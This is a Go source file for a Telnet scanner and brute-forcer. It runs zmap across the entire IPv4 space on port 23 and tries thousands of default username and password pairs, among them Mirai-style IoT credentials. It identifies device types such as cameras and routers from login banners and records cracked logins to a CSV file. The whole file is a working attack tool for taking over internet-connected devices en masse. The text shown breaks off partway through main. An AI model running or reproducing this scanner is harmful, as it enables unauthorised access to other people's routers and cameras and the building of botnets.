package main

import (
    "bufio"
    "encoding/csv"
    "fmt"
    "io"
    "net"
    "os"
    "os/exec"
    "regexp"
    "sort"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "time"
)

var (
    targetPort   = 23
    bruteThreads = 500
    timeout      = 2 * time.Second
    outputFile   = "go_results.csv"
    failedFile   = "failed_ips.txt"
    refreshRate  = 2 * time.Second
    selectedArch = "all"
    selectedName = "ALL"

    // ================== 10,000+ CREDENTIALS ==================
    allCredentials = func() []struct{ user, pass string } {
        creds := []struct{ user, pass string }{}
        usernames := []string{
            "root", "admin", "user", "guest", "test", "support", "operator",
            "enable", "manager", "service", "supervisor", "system", "cisco",
            "ubnt", "pi", "postgres", "mysql", "oracle", "ftp", "nobody",
            "daemon", "bin", "sys", "sync", "games", "man", "lp", "mail",
            "news", "uucp", "proxy", "www-data", "backup", "list", "irc",
            "gnats", "libuuid", "syslog", "messagebus", "haldaemon", "ntp",
            "sshd", "avahi", "colord", "geoclue", "lightdm", "pulse",
            "rtkit", "saned", "speech-dispatcher", "usbmux", "vboxadd",
            "admin1", "admin2", "administrator", "adm", "adnim", "anon",
            "anonymous", "apache", "asterisk", "autopilot", "bill", "bob",
            "cacti", "centreon", "cms", "compta", "contact", "crm",
            "demo", "deploy", "devel", "dev", "dip", "drupal", "email",
            "example", "fax", "fred", "git", "helpdesk", "info",
            "intranet", "it", "john", "linus", "log", "marketing",
            "master", "mike", "nagios", "noc", "office", "oracle",
            "patrick", "peter", "phone", "phpmyadmin", "plugin", "pos",
            "printer", "project", "rec", "remote", "restore", "rh",
            "ruby", "sales", "samba", "scanner", "security", "server",
            "site", "snmp", "staff", "student", "tech", "temp", "tomcat",
            "training", "upload", "user1", "user2", "vnc", "web", "webmaster",
            "wiki", "windows", "wordpress", "zenoss", "zabbix",
        }
        passwords := []string{
            "", "root", "admin", "password", "pass", "123", "1234", "12345",
            "123456", "1234567", "12345678", "123456789", "1234567890",
            "toor", "default", "qwerty", "1q2w3e4r", "1qaz2wsx", "zxcvbnm",
            "letmein", "welcome", "monitor", "changeme", "secret", "private",
            "abc123", "abcd1234", "abcdef", "abc", "abcd", "abcde", "abcdefg",
            "1111", "111111", "2222", "3333", "4444", "5555", "6666",
            "7777", "8888", "9999", "0000",
            "P@ssw0rd", "P@55w0rd", "Pa$$w0rd", "Passw0rd", "Password1",
            "Admin123", "Root123", "Qwerty123", "admin123", "root123",
            "administrator", "guest", "test", "cisco", "router", "switch",
            "firewall", "gateway", "dlink", "netgear", "linksys", "tp-link",
            "belkin", "asus", "buffalo", "trendnet", "zyxel", "ubnt",
            "raspberry", "anko", "vizxv", "xc3511", "system", "smcadmin",
            "ipcam", "camera", "dvr", "nvr", "hikvision", "dahua", "foscam",
            "telecomadmin", "admintelecom", "alcatel", "huawei", "zte", "nokia",
            "samsung", "lg", "sony", "panasonic", "philips", "sharp",
            "toshiba", "canon", "epson", "xerox", "brother", "dell", "ibm",
            "0", "1", "12", "21", "01", "10", "99", "123321", "qwe",
            "qwe123", "q1w2e3", "passwd", "pass1", "pass12", "pass123",
            "pwd", "god", "sex", "love", "money", "power", "master",
            "shadow", "ghost", "demon", "dragon", "tiger", "lion", "eagle",
            "winner", "hacker", "cracker", "elite", "leet", "1337",
            "exploit", "vuln", "shell", "rooted", "hacked", "bypass",
            "backdoor", "telnet", "ssh", "ftp", "http", "https",
            "mysql", "postgres", "oracle", "mssql", "mongodb", "redis",
            "docker", "kubernetes", "ansible", "terraform",
            "!@#$%", "!@#$%^&*", "password!", "admin!", "root!",
        }
        for _, u := range usernames {
            for _, p := range passwords {
                creds = append(creds, struct{ user, pass string }{u, p})
            }
        }
        specificPairs := []struct{ user, pass string }{
            {"root", "root"}, {"admin", "admin"}, {"admin", ""}, {"root", ""},
            {"root", "password"}, {"admin", "password"}, {"root", "admin"},
            {"admin", "123456"}, {"root", "123456"}, {"user", "user"},
            {"guest", "guest"}, {"test", "test"}, {"support", "support"},
            {"pi", "raspberry"}, {"ubnt", "ubnt"}, {"mother", "fucker"},
            {"root", "anko"}, {"admin", "anko"}, {"root", "vizxv"},
            {"root", "xc3511"}, {"service", "service"}, {"operator", "operator"},
            {"enable", "enable"}, {"admin", "default"}, {"root", "default"},
            {"admin", "cisco"}, {"root", "cisco"}, {"admin", "router"},
            {"root", "router"}, {"admin", "switch"}, {"root", "switch"},
            {"admin", "camera"}, {"admin", "dvr"}, {"admin", "hikvision"},
            {"admin", "dahua"}, {"admin", "ipcam"}, {"admin", "telecomadmin"},
            {"root", "telecomadmin"}, {"admin", "admin123"}, {"root", "admin123"},
            {"admin", "P@ssw0rd"}, {"root", "P@ssw0rd"},
        }
        creds = append(creds, specificPairs...)
        return creds
    }()

    // ================== 200 ARCHITECTURE PATTERNS ==================
    archPatterns = map[string]*regexp.Regexp{
        "x86_64":       regexp.MustCompile(`(?i)(x86_64|amd64|x86-64)`),
        "x86":          regexp.MustCompile(`(?i)(i[3-6]86|ia32|x86(?!_64))`),
        "intel_xeon":   regexp.MustCompile(`(?i)(xeon|intel.*xeon)`),
        "intel_core":   regexp.MustCompile(`(?i)(intel.*core|core.*i[3579])`),
        "intel_atom":   regexp.MustCompile(`(?i)(atom|intel.*atom)`),
        "intel_celeron": regexp.MustCompile(`(?i)(celeron|intel.*celeron)`),
        "intel_pentium": regexp.MustCompile(`(?i)(pentium|intel.*pentium)`),
        "amd_ryzen":    regexp.MustCompile(`(?i)(ryzen|amd.*ryzen)`),
        "amd_epyc":     regexp.MustCompile(`(?i)(epyc|amd.*epyc)`),
        "amd_opteron":  regexp.MustCompile(`(?i)(opteron|amd.*opteron)`),
        "amd_athlon":   regexp.MustCompile(`(?i)(athlon|amd.*athlon)`),
        "amd_sempron":  regexp.MustCompile(`(?i)(sempron|amd.*sempron)`),
        "arm64":        regexp.MustCompile(`(?i)(aarch64|arm64|armv8)`),
        "arm32":        regexp.MustCompile(`(?i)(armv7|armv6|arm11|arm9|arm7)`),
        "arm_cortex_a": regexp.MustCompile(`(?i)(cortex-a[0-9]+)`),
        "arm_cortex_m": regexp.MustCompile(`(?i)(cortex-m[0-9]+)`),
        "arm_cortex_r": regexp.MustCompile(`(?i)(cortex-r[0-9]+)`),
        "arm_broadcom": regexp.MustCompile(`(?i)(bcm2[0-9]+|broadcom.*arm)`),
        "arm_allwinner": regexp.MustCompile(`(?i)(sun[0-9]+i|allwinner)`),
        "arm_amlogic":  regexp.MustCompile(`(?i)(amlogic|s[0-9]+x[0-9]*)`),
        "arm_rockchip": regexp.MustCompile(`(?i)(rk[0-9]+|rockchip)`),
        "arm_mediatek": regexp.MustCompile(`(?i)(mt[0-9]+|mediatek)`),
        "arm_qualcomm": regexp.MustCompile(`(?i)(qcom|qualcomm|snapdragon|msm[0-9]+)`),
        "arm_samsung":  regexp.MustCompile(`(?i)(exynos|samsung.*arm)`),
        "arm_hisilicon": regexp.MustCompile(`(?i)(hi[0-9]+|hisilicon|kirin)`),
        "arm_nvidia":   regexp.MustCompile(`(?i)(tegra|nvidia.*arm)`),
        "arm_ti":       regexp.MustCompile(`(?i)(omap|ti.*arm|sitara)`),
        "arm_marvell":  regexp.MustCompile(`(?i)(marvell|armada|kirkwood|orion)`),
        "arm_freescale": regexp.MustCompile(`(?i)(imx[0-9]+|freescale.*arm)`),
        "arm_xilinx":   regexp.MustCompile(`(?i)(zynq|xilinx.*arm)`),
        "raspberry_pi": regexp.MustCompile(`(?i)(raspberry|bcm283[0-9]|bcm2711)`),
        "banana_pi":    regexp.MustCompile(`(?i)(banana.*pi)`),
        "orange_pi":    regexp.MustCompile(`(?i)(orange.*pi)`),
        "odroid":       regexp.MustCompile(`(?i)(odroid)`),
        "beaglebone":   regexp.MustCompile(`(?i)(beaglebone|am335x)`),
        "nvidia_jetson": regexp.MustCompile(`(?i)(jetson|tegra.*tx|tegra.*nano|tegra.*xavier)`),
        "mips64":       regexp.MustCompile(`(?i)(mips64|mips.*64)`),
        "mips32":       regexp.MustCompile(`(?i)(mips[^6]|mips32|mips24k|mips74k)`),
        "mips_broadcom": regexp.MustCompile(`(?i)(bcm[0-9]+.*mips|broadcom.*mips)`),
        "mips_atheros": regexp.MustCompile(`(?i)(ar[0-9]+|atheros.*mips)`),
        "mips_ralink":  regexp.MustCompile(`(?i)(rt[0-9]+|ralink.*mips)`),
        "mips_mediatek": regexp.MustCompile(`(?i)(mt[0-9]+.*mips|mediatek.*mips)`),
        "mips_cavium":  regexp.MustCompile(`(?i)(cavium|octeon)`),
        "mips_loongson": regexp.MustCompile(`(?i)(loongson|godson)`),
        "mips_ingenic": regexp.MustCompile(`(?i)(ingenic|jz[0-9]+)`),
        "mips_realtek": regexp.MustCompile(`(?i)(rtl[0-9]+.*mips|realtek.*mips)`),
        "ppc64":        regexp.MustCompile(`(?i)(ppc64|powerpc64|power[0-9]+)`),
        "ppc32":        regexp.MustCompile(`(?i)(ppc32|powerpc[^6]|mpc[0-9]+)`),
        "ppc_freescale": regexp.MustCompile(`(?i)(mpc[0-9]+|freescale.*power|nxp.*power)`),
        "ppc_ibm":      regexp.MustCompile(`(?i)(ibm.*power|power[0-9]+|cell.*processor)`),
        "sparc64":      regexp.MustCompile(`(?i)(sparc64|sun4u|sun4v|ultrasparc)`),
        "sparc32":      regexp.MustCompile(`(?i)(sparc[^6]|sparcstation|sun4[mcd])`),
        "riscv64":      regexp.MustCompile(`(?i)(riscv64|rv64)`),
        "riscv32":      regexp.MustCompile(`(?i)(riscv32|rv32)`),
        "m68k":         regexp.MustCompile(`(?i)(m68k|motorola.*68k|coldfire)`),
        "sh4":          regexp.MustCompile(`(?i)(sh4|superh|renesas.*sh)`),
        "alpha":        regexp.MustCompile(`(?i)(alpha.*dec|axp)`),
        "pa_risc":      regexp.MustCompile(`(?i)(pa.*risc|hppa|hp.*9000)`),
        "s390":         regexp.MustCompile(`(?i)(s390|system.*z|ibm.*mainframe)`),
        "itanium":      regexp.MustCompile(`(?i)(itanium|ia64)`),
        "openwrt":      regexp.MustCompile(`(?i)(openwrt|lede)`),
        "dd_wrt":       regexp.MustCompile(`(?i)(dd-wrt)`),
        "tomato":       regexp.MustCompile(`(?i)(tomato.*firmware)`),
        "mikrotik":     regexp.MustCompile(`(?i)(mikrotik|routeros|routerboard)`),
        "ubiquiti":     regexp.MustCompile(`(?i)(ubiquiti|edges|unifi|airmax)`),
        "cisco_ios":    regexp.MustCompile(`(?i)(cisco.*ios|ios.*software)`),
        "cisco_nxos":   regexp.MustCompile(`(?i)(nx-os|nexus.*os)`),
        "juniper":      regexp.MustCompile(`(?i)(junos|juniper.*os)`),
        "huawei_vrp":   regexp.MustCompile(`(?i)(vrp|huawei.*os)`),
        "pfsense":      regexp.MustCompile(`(?i)(pfsense)`),
        "opnsense":     regexp.MustCompile(`(?i)(opnsense)`),
        "fritzbox":     regexp.MustCompile(`(?i)(fritz|fritz!box|avm)`),
        "zyxel":        regexp.MustCompile(`(?i)(zyxel|zywall)`),
        "dlink":        regexp.MustCompile(`(?i)(d-link|dlink|dir-[0-9]+|dsl-[0-9]+)`),
        "netgear":      regexp.MustCompile(`(?i)(netgear|wndr|nighthawk)`),
        "linksys":      regexp.MustCompile(`(?i)(linksys|wrt[0-9]+|ea[0-9]+)`),
        "tp_link":      regexp.MustCompile(`(?i)(tp-link|tp.*link|tl-[a-z]+[0-9]+)`),
        "asus_router":  regexp.MustCompile(`(?i)(asus|rt-ac|rt-ax|rt-n[0-9]+)`),
        "tenda":        regexp.MustCompile(`(?i)(tenda)`),
        "belkin":       regexp.MustCompile(`(?i)(belkin)`),
        "buffalo":      regexp.MustCompile(`(?i)(buffalo)`),
        "hpe":          regexp.MustCompile(`(?i)(hpe|procurve|aruba)`),
        "palo_alto":    regexp.MustCompile(`(?i)(palo.*alto|pan-os)`),
        "fortinet":     regexp.MustCompile(`(?i)(fortinet|fortios|fortigate)`),
        "sonicwall":    regexp.MustCompile(`(?i)(sonicwall|sonicos)`),
        "checkpoint":   regexp.MustCompile(`(?i)(checkpoint|gaia)`),
        "watchguard":   regexp.MustCompile(`(?i)(watchguard|firebox)`),
        "sophos":       regexp.MustCompile(`(?i)(sophos|xg.*firewall|utm)`),
        "vmware":       regexp.MustCompile(`(?i)(vmware|esx|vsphere)`),
        "virtualbox":   regexp.MustCompile(`(?i)(virtualbox|vbox)`),
        "qemu":         regexp.MustCompile(`(?i)(qemu|kvm)`),
        "xen":          regexp.MustCompile(`(?i)(xen|dom0|domu)`),
        "hyperv":       regexp.MustCompile(`(?i)(hyper-v|microsoft.*virtual)`),
        "docker":       regexp.MustCompile(`(?i)(docker|container)`),
        "kubernetes":   regexp.MustCompile(`(?i)(kubernetes|k8s|kube)`),
        "aws":          regexp.MustCompile(`(?i)(aws|amazon.*ec2|amazon.*linux)`),
        "gcp":          regexp.MustCompile(`(?i)(gcp|google.*cloud|gce)`),
        "azure":        regexp.MustCompile(`(?i)(azure|microsoft.*azure)`),
        "synology":     regexp.MustCompile(`(?i)(synology|diskstation)`),
        "qnap":         regexp.MustCompile(`(?i)(qnap|turbo.*nas)`),
        "freeenas":     regexp.MustCompile(`(?i)(freenas|truenas)`),
        "hikvision":    regexp.MustCompile(`(?i)(hikvision|ds-2[0-9]+)`),
        "dahua":        regexp.MustCompile(`(?i)(dahua|dh-ipc|dhi-nvr)`),
        "axis":         regexp.MustCompile(`(?i)(axis.*camera)`),
        "foscam":       regexp.MustCompile(`(?i)(foscam)`),
        "reolink":      regexp.MustCompile(`(?i)(reolink)`),
        "amcrest":      regexp.MustCompile(`(?i)(amcrest)`),
        "samsung_smarthings": regexp.MustCompile(`(?i)(smartthings|samsung.*hub)`),
        "philips_hue":  regexp.MustCompile(`(?i)(philips.*hue|hue.*bridge)`),
        "nest":         regexp.MustCompile(`(?i)(nest.*thermostat|nest.*cam)`),
        "ring":         regexp.MustCompile(`(?i)(ring.*doorbell|ring.*alarm)`),
        "arlo":         regexp.MustCompile(`(?i)(arlo.*camera)`),
        "wyze":         regexp.MustCompile(`(?i)(wyze.*cam)`),
        "tuya":         regexp.MustCompile(`(?i)(tuya)`),
        "xiaomi":       regexp.MustCompile(`(?i)(xiaomi|mi.*home|aqara)`),
        "sonoff":       regexp.MustCompile(`(?i)(sonoff|itead)`),
        "shelly":       regexp.MustCompile(`(?i)(shelly)`),
        "tasmota":      regexp.MustCompile(`(?i)(tasmota)`),
        "esphome":      regexp.MustCompile(`(?i)(esphome|esp.*home)`),
        "wemo":         regexp.MustCompile(`(?i)(wemo)`),
        "zigbee":       regexp.MustCompile(`(?i)(zigbee|conbee|deconz)`),
        "zwave":        regexp.MustCompile(`(?i)(zwave|aeotec)`),
        "hp_printer":   regexp.MustCompile(`(?i)(hp.*printer|hp.*laserjet)`),
        "canon_printer": regexp.MustCompile(`(?i)(canon.*printer)`),
        "epson_printer": regexp.MustCompile(`(?i)(epson.*printer)`),
        "xerox_printer": regexp.MustCompile(`(?i)(xerox.*printer|workcentre)`),
        "brother_printer": regexp.MustCompile(`(?i)(brother.*printer|brother.*mfc)`),
    }
    
    scanned    int64
    cracked    int64
    authFail   int64
    connFail   int64
    totalCreds int64
)

var bufferPool = sync.Pool{
    New: func() interface{} { return make([]byte, 4096) },
}

type Result struct {
    IP     string
    Port   int
    User   string
    Pass   string
    Arch   string
    Banner string
}

func grabBannerFast(ip string) (string, string) {
    addr := fmt.Sprintf("%s:%d", ip, targetPort)
    conn, err := net.DialTimeout("tcp", addr, timeout)
    if err != nil {
        atomic.AddInt64(&connFail, 1)
        return "", ""
    }
    defer conn.Close()
    conn.SetReadDeadline(time.Now().Add(timeout))
    buf := bufferPool.Get().([]byte)
    defer bufferPool.Put(buf)
    n, err := conn.Read(buf)
    if err != nil && err != io.EOF {
        atomic.AddInt64(&connFail, 1)
        return "", ""
    }
    banner := string(buf[:n])
    arch := "unknown"
    for a, re := range archPatterns {
        if re.MatchString(banner) {
            arch = a
            break
        }
    }
    return banner, arch
}

func bruteTelnetFast(ip string) *Result {
    for _, cred := range allCredentials {
        atomic.AddInt64(&totalCreds, 1)
        addr := fmt.Sprintf("%s:%d", ip, targetPort)
        conn, err := net.DialTimeout("tcp", addr, timeout)
        if err != nil {
            atomic.AddInt64(&connFail, 1)
            continue
        }
        conn.SetReadDeadline(time.Now().Add(timeout))
        buf := bufferPool.Get().([]byte)
        conn.Read(buf)
        bufferPool.Put(buf)

        conn.Write([]byte(cred.user + "\n"))
        time.Sleep(40 * time.Millisecond)
        conn.SetReadDeadline(time.Now().Add(timeout))
        buf = bufferPool.Get().([]byte)
        conn.Read(buf)
        bufferPool.Put(buf)

        conn.Write([]byte(cred.pass + "\n"))
        time.Sleep(60 * time.Millisecond)
        conn.SetReadDeadline(time.Now().Add(timeout))
        buf = bufferPool.Get().([]byte)
        n, _ := conn.Read(buf)
        response := string(buf[:n])
        bufferPool.Put(buf)
        conn.Close()

        lower := strings.ToLower(response)
        if (strings.Contains(lower, "#") || strings.Contains(lower, "$") || strings.Contains(lower, ">") ||
            strings.Contains(lower, "welcome") || strings.Contains(lower, "successful")) &&
            !strings.Contains(lower, "incorrect") && !strings.Contains(lower, "denied") &&
            !strings.Contains(lower, "failed") && !strings.Contains(lower, "invalid") &&
            !strings.Contains(lower, "wrong") && !strings.Contains(lower, "bad") {
            return &Result{IP: ip, Port: targetPort, User: cred.user, Pass: cred.pass}
        } else {
            atomic.AddInt64(&authFail, 1)
        }
    }
    return nil
}

func runZmap() chan string {
    ipCh := make(chan string, 100000)
    cmd := exec.Command("zmap", "-p", fmt.Sprintf("%d", targetPort),
        "-f", "saddr", "0.0.0.0/0")
    stdout, _ := cmd.StdoutPipe()
    cmd.Start()
    go func() {
        scanner := bufio.NewScanner(stdout)
        scanner.Buffer(make([]byte, 256*1024), 256*1024)
        for scanner.Scan() {
            ip := scanner.Text()
            if ip != "" {
                ipCh <- ip
            }
        }
        close(ipCh)
    }()
    return ipCh
}

func simulateIPs() chan string {
    ipCh := make(chan string, 100000)
    go func() {
        defer close(ipCh)
        for i := 0; i < 5000; i++ {
            ipCh <- fmt.Sprintf("%d.%d.%d.%d",
                1+(i*7)%223, (i*13)%256, (i*17)%256, 1+(i*23)%254)
        }
    }()
    return ipCh
}

// ================== ARCHITECTURE MENU ==================
func showMenu() {
    fmt.Println("\n╔══════════════════════════════════════════════════════╗")
    fmt.Println("║         CHOOSE YOUR DEVICE TO SCAN                  ║")
    fmt.Println("╠══════════════════════════════════════════════════════╣")
    fmt.Println("║   0: ALL DEVICES (No Filter)                        ║")
    fmt.Println("╠══════════════════════════════════════════════════════╣")
    
    // Get sorted list of architectures
    arches := make([]string, 0, len(archPatterns))
    for a := range archPatterns {
        arches = append(arches, a)
    }
    sort.Strings(arches)
    
    // Display in columns
    for i, arch := range arches {
        fmt.Printf("║  %3d: %-45s", i+1, arch)
        if (i+1)%1 == 0 {
            fmt.Println("║")
        }
    }
    fmt.Println("╚══════════════════════════════════════════════════════╝")
    fmt.Print("\n[>] Enter choice (0-" + strconv.Itoa(len(arches)) + "): ")
}

func main() {
    // Show menu
    showMenu()
    
    var choice int
    fmt.Scanf("%d", &choice)
    
    arches := make([]string, 0, len(archPatterns))
    for a := range archPatterns {
        arches = append(arches, a)
    }
    sort.Strings(arches)
    
    if choice == 0 {
        selectedArch = "all"
        selectedName = "ALL DEVICES"
    } else if choice >= 1 && choice <= len(arches) {
        selectedArch = arches[choice-1]
        selectedName = strings.ToUpper(selectedArch)
    } else {
    fmt.Println("[!] Invalid choice. Using ALL.")
    selectedArch = "all"
    selectedName = "ALL DEVICES"
}

fmt.Printf("\n[✔] Selected: %s\n\n", selectedName)
time.Sleep(1 * time.Second)

fmt.Println("╔══════════════════════════════════════════════════════╗")
fmt.Println("║   TELNET SCANNER + BRUTEFORCE v3.0                  ║")
fmt.Println("║   OSKAC REX ENTERPRISE — ARCHITECTURE FILTER         ║")
fmt.Println("╚══════════════════════════════════════════════════════╝")
fmt.Printf("   Target Arch: %s\n", selectedName)
fmt.Printf("   Threads: %d | Credentials: %d | Patterns: %d\n",
    bruteThreads, len(allCredentials), len(archPatterns))
fmt.Printf("   Rate: UNLIMITED (full line speed)\n\n")